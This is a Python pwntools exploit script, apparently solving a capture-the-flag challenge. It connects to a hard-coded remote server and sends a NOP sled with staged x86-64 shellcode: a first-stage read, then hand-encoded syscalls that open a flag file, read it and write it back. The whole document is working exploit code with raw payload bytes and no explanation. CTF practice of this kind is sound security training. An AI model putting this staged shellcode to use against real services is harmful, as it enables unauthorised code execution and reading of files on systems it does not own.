from pwn import *
import string

#io = process('./challenge')
#gdb.attach(io, api=True)


io = remote('34.126.117.161', 3000)
flag_path = f'./warehouse/21e2ae0f_b85fde7bb246e_d90194f601e0_41b3c8ac6e937b1878bd8_e0e796a098'

payload = b'\x90'*400
#payload += asm(shellcraft.amd64.linux.read(0, 0xaabb0000, 0x1000), arch='amd64') #read shellcode
payload += b"\x31\xC0\x31\xFF\x31\xD2\xB6\x10\xBE\x01\x01\x01\x01\x81\xF6\x01\x01\xBA\xAB\x0F\x05"
payload += b"\x49\xBA\x00\x00\xBB\xAA\x00\x00\x00\x00\x41\xFF\xE2" #jump to shellcode
io.sendline(payload)

#payloadx64 = asm(shellcraft.amd64.linux.read(0, 0x404400, 0x500), arch='amd64')
payloadx64 = b"\x31\xC0\x31\xFF\x31\xD2\xB6\x05\xBE\x01\x01\x01\x01\x81\xF6\x01\x45\x41\x01\x0F\x05"
#payloadx64 = asm(shellcraft.amd64.linux.open(0x404400), arch='amd64')
payloadx64 += b"\xBF\x01\x01\x01\x01\x81\xF7\x01\x45\x41\x01\x31\xD2\x31\xF6\xFF\x34\x25\x00\x00\x00\x00\x58\x0F\x05"
#payloadx64 += asm(shellcraft.amd64.linux.read(3, 0x404400, 0x500), arch='amd64')
payloadx64 += b"\x31\xC0\x6A\x03\x5F\x31\xD2\xB6\x05\xBE\x01\x01\x01\x01\x81\xF6\x01\x45\x41\x01\x0F\x05"
#payloadx64 += asm(shellcraft.amd64.linux.write(1, 0x404400, 0x500), arch='amd64')
payloadx64 += b"\x6A\x01\x5F\x31\xD2\xB6\x05\xBE\x01\x01\x01\x01\x81\xF6\x01\x45\x41\x01\xFF\x34\x25\x00\x00\x00\x00\x58\x0F\x05"
payload = payloadx64
time.sleep(0.5)
io.send(payload)
time.sleep(0.5)
io.send(flag_path.encode())
io.interactive()
res = io.recvn(0x500)
if b'ISITDTU' in res:
    print(res)
io.close()